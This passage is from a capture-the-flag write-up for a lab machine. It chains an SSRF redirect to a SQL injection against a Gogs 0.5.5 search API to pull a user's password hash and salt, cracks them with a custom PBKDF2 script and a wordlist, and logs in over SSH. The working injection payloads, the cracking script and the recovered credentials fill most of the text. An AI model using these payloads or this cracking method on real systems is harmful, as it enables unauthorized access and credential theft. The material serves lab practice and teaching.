font-style: inherit;">"GET / HTTP/1.0"</span> 302 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb9-3"></span>
<span id="cb9-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Response</span></span>
<span id="cb9-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Body:</span></span>
<span id="cb9-6"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"webhookUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20:8888\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"monitoredUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"health"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"up"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"body"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">data</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:[{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">username</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">susanne</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">avatar</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">},{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">username</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">avatar</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">\/\/1.gravatar.com\/avatar\/</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}],</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">ok</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:true}"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"message"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HTTP\/1.0 302 Found"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"headers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Server"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"BaseHTTP\/0.6 Python\/3.10.5"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Date"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Tue, 23 Aug 2022 14:59:01 GMT"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Location"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/null,null,(select\/**\/passwd\/**\/from\/**\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\/**\/-"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Type"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"application\/json; charset=UTF-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Set-Cookie"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_csrf=; Path=\/; Max-Age=0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Length"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"263"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}}</span></span>
<span id="cb9-7"></span>
<span id="cb9-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/Aug/2022 16:59:01] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"POST / HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p>The extracted hash is very long and I don’t recognize it, and using <code>hash-identifier</code> we get the response <strong>Not Found</strong>. Reading a bit about Gogs password hash I find this <a href="https://blog.stigok.com/2017/03/06/lost-password-to-gogs-git-server-docker-instance.html">blog post</a> where a user locked himself out of Gogs trying to create a new hash. Here we find that a <strong>salt</strong> is needed and we should be able to extract it the same way we did with passwd. Unfortunately this blog post doesn’t succeed in replicating the hash, so we need to dig deeper for that.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health python3 redirect.py 80 <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-"</span></span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [24/Aug/2022 08:46:01] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET / HTTP/1.0"</span> 302 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb10-3"></span>
<span id="cb10-4"></span>
<span id="cb10-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Response</span></span>
<span id="cb10-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Body:</span></span>
<span id="cb10-7"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"webhookUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20:8888\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"monitoredUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"health"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"up"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"body"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">data</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:[{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">username</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">susanne</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">avatar</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">},{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">username</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">sO3XIbeW14</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">avatar</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">\/\/1.gravatar.com\/avatar\/</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}],</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">ok</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:true}"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"message"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HTTP\/1.0 302 Found"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"headers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Server"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"BaseHTTP\/0.6 Python\/3.10.5"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Date"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Wed, 24 Aug 2022 06:45:01 GMT"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Location"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/null,null,(select\/**\/salt\/**\/from\/**\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\/**\/-"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Type"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"application\/json; charset=UTF-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Set-Cookie"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_csrf=; Path=\/; Max-Age=0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Length"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"173"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}}</span></span></code></pre></div>
<p>So now we have all three needed ingredients needed to build and crack the password and hopefully gain access to the system: 1. Username: <code>susanne</code> 2. Hash: <code>66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37</code> 3. Salt: <code>sO3XIbeW14</code></p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Downloading the <a href="https://github.com/gogs/gogs/releases/tag/v0.5.5">source code</a> for Gogs 0.5.5 and looking for the password encoding function we find this on line 117:</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode go code-with-copy"><code class="sourceCode go"><span id="cb11-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// gogs/models/user.go</span></span>
<span id="cb11-2">newPasswd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:=</span> base<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>PBKDF2<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">([]</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">byte</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>u<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>Passwd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">),</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[]</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">byte</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>u<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>Salt<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">),</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10000</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">50</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> sha256<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span>New<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span></code></pre></div>
<p>As I see it we can solve this two different ways; 1. The programmatically simple solution where we make a script encode a string with the same algorithm and salt, and compare the end result to the found hash. 2. Or make a script that reformats hash + salt to hashcat format.</p>
<p>Since I’m not a programmer, I chose to go with option one, knowing this will take far longer to crack as I’ll never build anything as efficient as hashcat. Googling around I found <a href="https://stackoverflow.com/questions/72661995/python-hashing-password-with-pbkdf2">this post</a> and used it as foundation for my script. I made some tweaks to import strings from list and fired it up:</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb12-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/usr/bin/python3</span></span>
<span id="cb12-2"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> hashlib</span>
<span id="cb12-3"><span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">import</span> binascii</span>
<span id="cb12-4"></span>
<span id="cb12-5"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> main():</span>
<span id="cb12-6">    salt <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b'sO3XIbeW14'</span></span>
<span id="cb12-7">    iterations <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10000</span></span>
<span id="cb12-8">    count <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span></span>
<span id="cb12-9">    </span>
<span id="cb12-10">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">### ---=== START ===---</span></span>
<span id="cb12-11">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">##Segment for easy troubleshooting</span></span>
<span id="cb12-12">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#password = b'test'</span></span>
<span id="cb12-13">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#key = hashlib.pbkdf2_hmac("sha256", password, salt, iterations, 50)</span></span>
<span id="cb12-14">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#print(key.hex())</span></span>
<span id="cb12-15">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#print(binascii.hexlify(key))</span></span>
<span id="cb12-16">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#pwcompare(key.hex(),password)</span></span>
<span id="cb12-17">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">### ---=== </span><span class="re">END</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"> ===---</span></span>
<span id="cb12-18"></span>
<span id="cb12-19">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">file</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">input</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Enter path to password file: '</span>)</span>
<span id="cb12-20">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">with</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">open</span>(<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">file</span>) <span class="im" style="color: #00769E;
background-color: null;
font-style: inherit;">as</span> pw_file:</span>
<span id="cb12-21">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> passwd <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">in</span> pw_file:</span>
<span id="cb12-22">            s <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> passwd.rstrip()</span>
<span id="cb12-23">            pw_byte <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">bytes</span>(s, encoding<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'utf-8'</span>)</span>
<span id="cb12-24">            key <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> hashlib.pbkdf2_hmac(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256"</span>, pw_byte, salt, iterations, <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">50</span>)</span>
<span id="cb12-25">            count <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> count <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span></span>
<span id="cb12-26">            pwcompare(key.<span class="bu" style="color: null;
background-color: null;
font-style: inherit;">hex</span>(),s,count)</span>
<span id="cb12-27"></span>
<span id="cb12-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> pwcompare(hex_key,password,count):</span>
<span id="cb12-29">    target_key <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37'</span></span>
<span id="cb12-30">    </span>
<span id="cb12-31">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Troubleshooting hash for b'test'</span></span>
<span id="cb12-32">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#target_key = 'fa21b095cfa6e55dff39c11c2ba8a75e7392a9a34f24207d10b38fcde7a0b252a38590631ca6acf3257c8a7edb7598498de9'</span></span>
<span id="cb12-33">    </span>
<span id="cb12-34">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> hex_key <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> target_key:</span>
<span id="cb12-35">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(count,<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"---=== Password is:"</span>,password, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"===---"</span>)</span>
<span id="cb12-36">        exit()</span>
<span id="cb12-37">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">else</span>:</span>
<span id="cb12-38">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(count,<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"- Testing password:"</span>,password)</span>
<span id="cb12-39"></span>
<span id="cb12-40"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">__name__</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__main__"</span>:</span>
<span id="cb12-41">    main()</span></code></pre></div>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health ./decrypt.py</span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> path to password file: /usr/share/wordlists/rockyou.txt   </span>
<span id="cb13-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Testing password: 123456</span>
<span id="cb13-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Testing password: 12345</span>
<span id="cb13-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb13-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">70966</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Testing password: feilunhai</span>
<span id="cb13-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">70967</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">---</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>== Password is: february15 ===---</span></code></pre></div>
<p>Test to login with cracked credentials and grab user.txt</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health ssh susanne@health.htb</span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">susanne@health.htb</span> password: february15</span>
<span id="cb14-3"></span>
<span id="cb14-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">susanne@health:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> user.txt</span>
<span id="cb14-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">susanne</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">susanne</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">susanne</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb14-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a47815867df7df685c95bd170197d921</span></span></code></pre></div>
